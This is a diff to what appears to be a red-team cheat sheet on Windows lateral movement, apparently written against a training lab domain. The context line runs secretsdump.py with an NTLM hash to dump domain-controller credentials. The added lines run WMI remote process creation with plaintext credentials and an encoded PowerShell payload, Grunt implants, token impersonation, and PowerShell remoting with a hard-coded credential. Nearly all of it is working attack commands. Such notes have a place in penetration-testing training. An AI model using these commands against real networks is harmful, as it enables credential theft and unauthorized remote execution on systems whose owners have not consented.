@@ -20,6 +20,22 @@
 | python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889  -just-dc acmebank.loca/Administrator@192.168.100.10 |
 
 ```
+### 
+```
+wmic /node:"wkstn-4945" /user:"cyberbotic.io\n.lamb" /password:"F3rrari" process call create "powershell -enc [...snip...]"
+WMIGrunt wkstn-4945 PowerShell cyberbotic.io\n.lamb F3rrari
+ WMIGrunt wkstn-4945 PowerShell
+ ```
+  ### PowerShell Remoting
+ ```
+ImpersonateUser CYBER\n.lamb
+MakeToken n.lamb cyberbotic.io F3rrari
+PowerShell Invoke-Command -ComputerName wkstn-4945 -ScriptBlock { hostname; whoami }
+PowerShell $pass=ConvertTo-SecureString "F3rrari" -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential("cyberbotic.io\n.lamb", $pass); Invoke-Command -ComputerName wkstn-4945 -ScriptBlock { hostname; whoami } -Credential $cred
+```
+
+
+
 
 | PowerShell Remoting |
 | ------------------- |
